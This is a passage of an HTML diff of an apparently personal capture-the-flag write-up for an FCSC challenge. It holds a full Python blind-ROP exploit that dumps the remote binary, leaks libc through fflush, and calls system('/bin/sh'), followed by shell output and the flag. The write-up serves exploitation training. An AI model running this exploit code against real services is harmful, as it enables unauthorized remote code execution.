-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] recv @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">leak</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[*] recv @ {hex(base+i)}: {leak.hex()}&#34;</span><span class="p">)</span>
 
             <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
 
         <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mh">0x100</span><span class="p">:</span> <span class="c1"># we write bytes to the file each 0x100 bytes</span>
             <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
             <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
-            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Buffering ..&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Buffering ..&#34;</span><span class="p">)</span>
 </code></pre></div><p>Because of my connection I have to relaunch the script with a different base address to dump the whole binary but anyway, it works !</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
+<div class="highlight"><pre class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
 <span class="o">[</span>skip<span class="o">]</span>
 <span class="o">[</span>*<span class="o">]</span> recv @ 0x400fff: 0x00
 STOP: &lt;class <span class="s1">&#39;KeyboardInterrupt&#39;</span>&gt;
@@ -611,7 +611,7 @@ $ ./solve.py
   
   >this</a
 > to find from the offset of fflush and read, the right version. Which gives:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">__libc_start_main 	0x021a50 	0x0
+<div class="highlight"><pre class="chroma"><code class="language-Shell" data-lang="Shell">__libc_start_main 	0x021a50 	0x0
 system 	0x041490 	0x1fa40
 fflush 	0x069ab0 	0x48060
 open 	0x0db950 	0xb9f00
@@ -627,7 +627,7 @@ str_bin_sh 	0x1633e8 	0x141998
     </h2>
 </div>
 <p>I&rsquo;ll no detail a lot the final part because it&rsquo;s a basic rop payload. But since we got the right gadgets from the leaked binary, it&rsquo;s very easy. We have to notice that this exploit is not 100% reiable, if the address of FFLUSH in the GOT has a NULL byte the exploit will not work. Here is the final function:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">STOP_GADGETS</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x400668</span><span class="p">]</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="n">STOP_GADGETS</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x400668</span><span class="p">]</span>
 
 <span class="n">CSU_POP</span> <span class="o">=</span> <span class="mh">0x40073a</span>
 <span class="n">POP_RDI</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x9</span>
@@ -641,14 +641,14 @@ str_bin_sh 	0x1633e8 	0x141998
 <span class="n">SYSTEM</span> <span class="o">=</span> <span class="mh">0x041490</span>
 
 <span class="k">def</span> <span class="nf">try_jmp_flow</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
         <span class="k">try</span><span class="p">:</span>
             <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
             <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
             <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
             <span class="k">break</span>
         <span class="k">except</span><span class="p">:</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;STOP: {sys.exc_info()[0]}&#34;</span><span class="p">)</span>
             <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
             <span class="k">break</span>
 
@@ -664,11 +664,11 @@ str_bin_sh 	0x1633e8 	0x141998
 
     <span class="n">pattern</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">unpadd</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">))</span>
     <span class="n">resp_tmp</span><span class="p">,</span> <span class="n">io</span> <span class="o">=</span> <span class="n">try_jmp_flow</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-    <span class="nb">print</span><span class="p">(</span><span class="n">resp_tmp</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">resp_tmp</span><span class="p">)</span>
     <span class="n">leak_fflush</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">resp_tmp</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">pattern</span><span class="p">):</span><span class="n">resp_tmp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;What is&#39;</span><span class="p">)],</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
 
     <span class="n">libc</span> <span class="o">=</span> <span class="n">leak_fflush</span> <span class="o">-</span> <span class="n">FFLUSH_OFFSET</span> 
-    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;libc @ {hex(libc)}&#34;</span><span class="p">)</span>
 
     <span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span>
     <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
@@ -680,7 +680,7 @@ str_bin_sh 	0x1633e8 	0x141998
 
 <span class="n">flow</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
 </code></pre></div><p>And when we run it, we got a shell yeeeeeah !</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
+<div class="highlight"><pre class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
 b<span class="s1">&#39;Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC\x07@\xb0J\xa2\xd7&lt;\x7fWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
 libc @ 0x7f3cd79bb000
 $ id
@@ -688,7 +688,7 @@ $ id
 $ cat flag
 FCSC<span class="o">{</span>3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28<span class="o">}</span>
 </code></pre></div><p>Here is the final script:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/python3</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/python3</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">STOP_GADGETS</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x400668</span><span class="p">]</span>
@@ -738,9 +738,9 @@ FCSC<span class="o">{</span>3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50
 
 <span class="k">def</span> <span class="nf">find_padding</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">):</span>
     <span class="n">padding</span> <span class="o">=</span> <span class="n">p</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span>
-    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] sending: </span><span class="si">{</span><span class="n">padding</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[*] sending: {padding}&#34;</span><span class="p">)</span>
     <span class="n">resp</span> <span class="o">=</span> <span class="n">jmp</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span>
-    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] recv: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[*] recv: {resp}&#34;</span><span class="p">)</span>
     <span class="k">while</span> <span class="sa">b</span><span class="s2">&#34;Hello you.</span><span class="se">\n</span><span class="s2">What is your name ?</span><span class="se">\n</span><span class="s2">&gt;&gt;&gt; Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
         <span class="k">return</span> <span class="n">find_padding</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="n">padding</span><span class="p">)</span>
     <span class="k">return</span> <span class="n">padding</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># minus one char because we do not want that padding overwrite the return address</span>
@@ -751,7 +751,7 @@ FCSC<span class="o">{</span>3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50
         <span class="n">resp</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
         <span class="c1"># print(f&#34;Trying on {hex(int.from_bytes(leak1+p8(i), &#39;little&#39;) &lt;&lt; (64 - counter*8))}&#34;)</span>
         <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">padd</span><span class="p">(</span><span class="n">leak1</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">)),</span> <span class="s1">&#39;little&#39;</span><span class="p">))</span><span class="si">}</span><span class="s2">] Output: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[{hex(int.from_bytes(padd(leak1+p8(i)), &#39;little&#39;))}] Output: {resp}&#34;</span><span class="p">)</span>
             <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">:</span>
                 <span class="n">leak2</span><span class="p">(</span><span class="n">padding</span><span class="p">,</span> <span class="n">leak1</span><span class="o">=</span><span class="n">leak1</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
             <span class="k">else</span><span class="p">:</span>
@@ -767,7 +767,7 @@ FCSC<span class="o">{</span>3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50
         <span class="n">resp</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
         <span class="c1"># print(f&#34;Trying on {hex(int.from_bytes(leak1+p8(i), &#39;little&#39;) &lt;&lt; (64 - counter*8))}&#34;)</span>
         <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">] Output: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[{hex(base+i)}] Output: {resp}&#34;</span><span class="p">)</span>
             <span class="k">continue</span>
 
     <span class="k">return</span> <span class="n">leak1</span>
@@ -779,11 +779,11 @@ FCSC<span class="o">{</span>3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50
         <span class="n">buf</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">STOP_GADGETS</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
         <span class="n">resp</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
         <span class="k">if</span> <span class="n">is_stop</span><span class="p">(</span><span class="n">resp</span><span class="p">,</span> <span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">padding</span><span class="p">):</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Output: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">, leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">i</span><span class="p">),</span> <span class="s1">&#39;little&#39;</span><span class="p">))</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;Output: {resp}, leak: {hex(int.from_bytes(p64(base + i), &#39;little&#39;))}&#34;</span><span class="p">)</span>
             <span class="k">break</span>
 
         <span class="k">if</span> <span class="ow">not</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">35</span><span class="p">:</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;_ - </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;_ - {hex(i)}&#34;</span><span class="p">)</span>
 
     <span class="k">return</span> <span class="n">base</span> <span class="o">+</span> <span class="n">i</span>
 
@@ -806,18 +806,18 @@ FCSC<span class="o">{</span>3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50
         
         <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">):</span>
             <span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] recv @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">: 0x00&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[*] recv @ {hex(base+i)}: 0x00&#34;</span><span class="p">)</span>
             <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
         <span class="k">else</span><span class="p">:</span>
             <span class="n">buf</span> <span class="o">+=</span> <span class="n">leak</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] recv @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">leak</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[*] recv @ {hex(base+i)}: {leak.hex()}&#34;</span><span class="p">)</span>
 
             <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
         
         <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mh">0x100</span><span class="p">:</span>
             <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
             <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
-            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Buffering ..&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Buffering ..&#34;</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">find_plt</span><span class="p">(</span><span class="n">padding</span><span class="p">):</span>
     <span class="n">base</span> <span class="o">=</span> <span class="mh">0x400000</span> 
@@ -827,34 +827,34 @@ FCSC<span class="o">{</span>3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50
         <span class="n">resp1</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_R15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">STOP_GADGETS</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span> 
 
         <span class="k">if</span> <span class="n">is_stop</span><span class="p">(</span><span class="n">resp1</span><span class="p">,</span> <span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">padding</span><span class="p">):</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Output: </span><span class="si">{</span><span class="n">resp1</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">, leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">i</span><span class="p">),</span> <span class="s1">&#39;little&#39;</span><span class="p">))</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;Output: {resp1.hex()}, leak: {hex(int.from_bytes(p64(base + i), &#39;little&#39;))}&#34;</span><span class="p">)</span>
 
         <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp1</span><span class="p">):</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">] Out: </span><span class="si">{</span><span class="n">resp1</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[{hex(base+i)}] Out: {resp1.hex()}&#34;</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">try_jmp</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
         <span class="k">try</span><span class="p">:</span>
             <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
             <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
             <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
             <span class="k">break</span>
         <span class="k">except</span><span class="p">:</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;STOP: {sys.exc_info()[0]}&#34;</span><span class="p">)</span>
             <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
             <span class="k">break</span>
 
     <span class="k">return</span> <span class="n">resp</span>
 
 <span class="k">def</span> <span class="nf">try_jmp_flow</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
         <span class="k">try</span><span class="p">:</span>
             <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
             <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
             <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
             <span class="k">break</span>
         <span class="k">except</span><span class="p">:</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;STOP: {sys.exc_info()[0]}&#34;</span><span class="p">)</span>
             <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
             <span class="k">break</span>
 
@@ -870,11 +870,11 @@ FCSC<span class="o">{</span>3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50
 
     <span class="n">pattern</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">unpadd</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">))</span>
     <span class="n">resp_tmp</span><span class="p">,</span> <span class="n">io</span> <span class="o">=</span> <span class="n">try_jmp_flow</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-    <span class="nb">print</span><span class="p">(</span><span class="n">resp_tmp</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">resp_tmp</span><span class="p">)</span>
     <span class="n">leak_fflush</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">resp_tmp</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">pattern</span><span class="p">):</span><span class="n">resp_tmp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;What is&#39;</span><span class="p">)],</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
 
     <span class="n">libc</span> <span class="o">=</span> <span class="n">leak_fflush</span> <span class="o">-</span> <span class="n">FFLUSH_OFFSET</span> 
-    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;libc @ {hex(libc)}&#34;</span><span class="p">)</span>
 
     <span class="n">payload</span> <span class="o">=</span> <span class="n">av</span>
     <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
